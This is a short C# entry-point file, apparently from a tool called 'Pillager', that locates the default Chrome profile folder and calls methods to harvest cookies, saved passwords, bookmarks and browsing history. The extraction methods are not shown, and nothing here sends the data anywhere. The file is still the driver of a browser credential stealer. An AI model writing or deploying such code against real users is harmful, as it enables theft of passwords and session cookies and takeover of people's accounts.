using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default");
            Chrome chrome = new Chrome(chromepath);
            string cookies = chrome.Chrome_cookies();
            string passwords = chrome.Chrome_passwords();
            string books = chrome.Chrome_books();
            string history = chrome.Chrome_history();

            Console.ReadLine();
        }
    }
}
